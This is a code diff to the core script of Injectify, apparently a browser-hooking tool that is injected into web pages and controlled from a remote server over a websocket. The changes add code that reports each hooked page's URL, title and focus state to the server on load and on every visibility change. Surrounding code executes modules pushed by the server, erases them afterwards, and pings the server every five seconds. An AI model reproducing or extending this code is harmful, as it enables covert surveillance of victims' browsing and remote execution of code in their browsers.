@@ -103,7 +103,7 @@ window['injectify'] = /** @class */ (function () {
      * @param {boolean} local Whether to log it in the local console
      */
     Injectify.log = function (message, local) {
-        this.send('r', message);
+        this.send('l', message);
         if (local)
             console.log(message);
     };
@@ -242,6 +242,38 @@ window['injectify'] = /** @class */ (function () {
         enumerable: true,
         configurable: true
     });
+    Object.defineProperty(Injectify, "sessionInfo", {
+        /**
+         * Returns information about the current session, browser etc.
+         */
+        get: function () {
+            /**
+             * Get the correct document.hidden method
+             */
+            var hidden = 'hidden';
+            if ('mozHidden' in document) {
+                hidden = 'mozHidden';
+            }
+            else if ('webkitHidden' in document) {
+                hidden = 'webkitHidden';
+            }
+            else if ('msHidden' in document) {
+                hidden = 'msHidden';
+            }
+            /**
+             * Return object
+             */
+            return {
+                'window': {
+                    'url': window.location.href,
+                    'title': document.title ? document.title : window.location.host + window.location.pathname,
+                    'focused': !document[hidden],
+                }
+            };
+        },
+        enumerable: true,
+        configurable: true
+    });
     Object.defineProperty(Injectify, "debug", {
         /**
          * Returns whether injectify is in debug mode or not
@@ -283,19 +315,28 @@ window['injectify'] = /** @class */ (function () {
     return Injectify;
 }());
 /**
+ * Create local reference to window.injectify
+ */
+var injectify = window['injectify'];
+/**
  * Set the connect time
  */
-window['injectify'].connectTime = +new Date;
+injectify.connectTime = +new Date;
 /**
  * Debug helpers
  */
-if (window['injectify'].debug) {
-    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', window['injectify'].info);
+if (injectify.debug) {
+    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info);
 }
+/**
+ * Send session info to the Injectify server
+ */
+injectify.send('i', injectify.sessionInfo);
+console.log(injectify.sessionInfo);
 /**
  * Replace the basic websocket handler with a feature-rich one
  */
-window['injectify'].listener(function (data, topic) {
+injectify.listener(function (data, topic) {
     try {
         if (topic == 'error') {
             console.error(data);
@@ -322,7 +363,7 @@ window['injectify'].listener(function (data, topic) {
                 /**
                  * If in debug mode display verbose output
                  */
-                if (window['injectify'].debug) {
+                if (injectify.debug) {
                     console.warn('📦 Executed module "' + module.name + '"', module);
                 }
                 /**
@@ -336,7 +377,7 @@ window['injectify'].listener(function (data, topic) {
                  */
                 return delete window[data.token];
             }
-            else if (window['injectify'].debug && data.error.message) {
+            else if (injectify.debug && data.error.message) {
                 console.error('📦 ' + data.error.message, module);
             }
         }
@@ -345,13 +386,43 @@ window['injectify'].listener(function (data, topic) {
         }
     }
     catch (e) {
-        window['injectify'].error(e.stack);
+        injectify.error(e.stack);
     }
 });
+/**
+ * Page Visibility API
+ */
+(function () {
+    var listener;
+    var focusChange = function () { return injectify.send('i', injectify.sessionInfo); };
+    /**
+     * Get the correct hidden listener
+     */
+    if ('hidden' in document) {
+        listener = 'visibilitychange';
+    }
+    else if ('mozHidden' in document) {
+        listener = 'mozvisibilitychange';
+    }
+    else if ('webkitHidden' in document) {
+        listener = 'webkitvisibilitychange';
+    }
+    else if ('msHidden' in document) {
+        listener = 'msvisibilitychange';
+    }
+    else {
+        window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange;
+    }
+    /**
+     * Add listener
+     */
+    if (listener)
+        document.addEventListener(listener, focusChange);
+})();
 /**
  * Ping the server every 5 seconds to sustain the connection
  */
 clearInterval(window['ping']);
 window['ping'] = setInterval(function () {
-    window['injectify'].send('heartbeat');
+    injectify.send('heartbeat');
 }, 5000);
